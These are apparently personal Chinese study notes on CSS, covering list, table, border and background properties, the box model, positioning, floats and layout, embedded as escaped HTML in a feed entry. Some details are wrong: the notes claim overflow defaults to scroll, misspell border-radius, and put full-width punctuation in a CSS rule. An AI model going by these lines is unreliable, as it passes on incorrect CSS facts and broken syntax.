&lt;p&gt;CSS列表：用来设置列表项标志，可以将图片作为列表项标志&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;list-style&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;list-style-image&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;list-style-position&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;list-style-type&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;CSS表格：为表格设置边框、背景、边距、文本对齐&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;border-collapse:合并边框&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;border-spacing:设置分割单元格边框的距离&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;caption-side：设置标题的位置&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;text-align vertical-align:设置水平对齐和垂直对齐&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;border padding:设置边框和内边距&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;width height：设置宽度和高度&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;CSS边框：可以设置边框圆角、向矩形添加阴影、使用图片来绘制边框&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;boder-radius:设置边框圆角&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;box-shadow：设置边框阴影&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;border-image：设置边框图片(验证一下)&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;CSS背景：可以设置背景图片的尺寸、定位区域、绘制背景区域&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;background:&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;background-image:&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;background-size:&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;background-repeat:&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;CSS盒模型&lt;&#x2F;p&gt;
&lt;p&gt;CSS网页布局有盒模型、浮动、定位三个技术&lt;&#x2F;p&gt;
&lt;p&gt;盒模型包括元素内容、内边距、边框、外边距&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91&#x2F;image-20200808143140750.png&quot; alt=&quot;image-20200808143140750&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;元素可以通过width和height来设置宽度和高度&lt;&#x2F;p&gt;
&lt;p&gt;内边距：元素到边框的距离&lt;&#x2F;p&gt;
&lt;p&gt;边框：内外边距的分界&lt;&#x2F;p&gt;
&lt;p&gt;外边距：距离其他元素的距离&lt;&#x2F;p&gt;
&lt;p&gt;设置背景的时候，背景应用的范围是元素+内边距+边框&lt;&#x2F;p&gt;
&lt;p&gt;元素宽度设置为50px，内边距设置5px，边框1px，总宽度是多少？&lt;&#x2F;p&gt;
&lt;p&gt;CSS核心的思想：一切皆盒子&lt;&#x2F;p&gt;
&lt;p&gt;元素的类型：块元素、内联元素、内联块状元素&lt;&#x2F;p&gt;
&lt;p&gt;一般情况下，内联元素不能应用盒模型，但可以通过CSS修改元素类型来实现&lt;&#x2F;p&gt;
&lt;p&gt;设置时常见的属性：&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;width&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;height&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;padding&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;margin&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;border&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;CSS设置之前，需要先删除元素默认的内外边距&lt;&#x2F;p&gt;
&lt;p&gt;*{&lt;&#x2F;p&gt;
&lt;p&gt;padding：0；&lt;&#x2F;p&gt;
&lt;p&gt;margin:0;&lt;&#x2F;p&gt;
&lt;p&gt;}&lt;&#x2F;p&gt;
&lt;p&gt;CSS定位&lt;&#x2F;p&gt;
&lt;p&gt;CSS有三种定位机制：普通流、 浮动、 绝对定位，若没有设置定位机制，默认使用普通流，也就是说文档中的元素按照从上到下，从左到右的顺序来排列&lt;&#x2F;p&gt;
&lt;p&gt;定位属性就是对元素进行定位，让元素出现在特定位置&lt;&#x2F;p&gt;
&lt;p&gt;常见的定位属性：&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;绝对定位：相对于离自己最近的最近的已经定位的祖先元素来进行定位。如果没有已经定位的祖先元素，那么它就相对于最初的包含块。元素会脱离原来的文档流不占据空间&lt;&#x2F;li&gt;
&lt;li&gt;相对定位：相对于元素原来的位置。元素仍然会占据原来的空间，元素仍然处于正常的文档流中&lt;&#x2F;li&gt;
&lt;li&gt;固定定位：将元素固定在浏览器的某一个位置，不会随着浏览器的滚动条的移动而变化，固定定位是相对于当前浏览器的窗口&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;设置元素溢出使用overflow：默认是scroll，即添加滚动条，可以设置成hidden来隐藏溢出的内容&lt;&#x2F;p&gt;
&lt;p&gt;如果要使用层叠使用 z-index,默认值是零，设为正数代表离用户近&lt;&#x2F;p&gt;
&lt;p&gt;CSS浮动&lt;&#x2F;p&gt;
&lt;p&gt;设置元素会脱离正常的文档流，向左或者向又浮动&lt;&#x2F;p&gt;
&lt;p&gt;浮动的元素会不断地向左或者向右浮动，直到碰到其他元素或者包含块的边缘。因为浮动的元素是脱离了正常文档流，所以会使其他元素重新排列，如果想让其他元素不受浮动属性影响，可以给其他元素设置“清除浮动”属性&lt;&#x2F;p&gt;
&lt;p&gt;float: left&lt;&#x2F;p&gt;
&lt;p&gt;float: right&lt;&#x2F;p&gt;
&lt;p&gt;clear: right&#x2F;left&lt;&#x2F;p&gt;
&lt;p&gt;CSS布局&lt;&#x2F;p&gt;
&lt;p&gt;根据网页结构来看，分为一列布局，两列布局，三列和混合布局&lt;&#x2F;p&gt;
&lt;p&gt;从布局方法来看，分为流式布局、浮动布局、定位布局&lt;&#x2F;p&gt;
&lt;p&gt;布局技术有盒模型、浮动、定位三种技术&lt;&#x2F;p&gt;
&lt;p&gt;HTML布局&lt;&#x2F;p&gt;
&lt;p&gt;网页分为头部、banner、nav、mainbody、footer&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;HTML%E4%B8%8ECSS&#x2F;%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20200814105241.png&quot; alt=&quot;微信图片_20200814105241&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
</content>
	</entry>
</feed>
